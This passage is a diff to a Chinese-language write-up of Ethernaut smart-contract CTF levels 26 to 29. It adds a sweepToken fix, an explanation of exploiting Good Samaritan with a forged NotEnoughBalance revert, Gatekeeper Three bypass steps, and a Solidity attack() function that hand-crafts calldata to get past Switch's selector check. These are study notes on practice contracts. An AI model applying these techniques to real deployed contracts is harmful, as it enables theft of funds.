@@ -758,13 +758,63 @@ contract Destroyer {
 await destroyerContract.methods.destroy(logicAddress).send({ from: player });
 ```
 
-## 26. DoubleEntryPoint 🔒
+## 26. DoubleEntryPoint ✅[Easy]
 
-## 27. Good Samaritan 🔒
+直接中间合约调用sweepToken(LGT)就完了，修复的话
+```solidity
+function sweepToken(IERC20 token) external onlyOwner {
+    require(address(token) != address(det), "Can't sweep DET tokens");
+    require(address(token) != address(legacyToken), "Can't sweep LegacyToken");
+    token.transfer(owner(), token.balanceOf(address(this)));
+}
+```
 
-## 28. Gatekeeper Three 🔒
+## 27. Good Samaritan ✅[Easy]
 
-## 29. Switch 🔒
+这题直接找到Inotify发现这个可以利用，然后还有个点就是利用
+```solidity
+catch (bytes memory err) {
+            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
+                // send the coins left
+                wallet.transferRemainder(msg.sender);
+                ...
+            }
+        }
+```
+这里直接捕获到对应的错误就把剩余的代币全转了，而且转之前也不看看是不是真的amount<10了，所以可以利用前一个实现notify的时候返回对应的err( revert("NotEnoughBalance()");)，然后就可以把剩余的代币全转了
+
+## 28. Gatekeeper Three ✅[Medium]
+
+思路：
+- 调用 construct0r 将 owner 设置为你的地址。
+- 调用 createTrick 创建 SimpleTrick 实例。
+- 找到 SimpleTrick 合约的 password。
+- 调用 getAllowance(password) 将 allowEntrance 设置为 true。
+- 确保合约余额大于 0.001 ether，并将 owner 地址设置为无法接收以太币的合约。
+- 通过代理合约调用 enter 函数，绕过 gateOne 检查。
+- 成功设置 entrant。
+
+## 29. Switch ✅[Easy]
+
+我的思路是直接调用flipSwitch，传入的参数是把bytes4(keccak256("turnSwitchOff()"))放在低次位的四个字节上
+```solidity
+function attack() public {
+        // 构造 _data：
+        // 前 4 字节是 turnSwitchOn 的选择器
+        // 第 68-72 字节是 turnSwitchOff 的选择器
+        bytes memory data = abi.encodeWithSelector(
+            target.turnSwitchOn.selector // 实际调用 turnSwitchOn
+        );
+
+        // 在第 68-72 字节插入 turnSwitchOff 的选择器
+        assembly {
+            mstore(add(data, 0x44), shl(224, 0x9c60e39d)) // turnSwitchOff selector
+        }
+
+        // 调用 flipSwitch，触发目标逻辑
+        target.flipSwitch(data);
+}
+```
 
 ## 30. Privacy 2 🔒
 
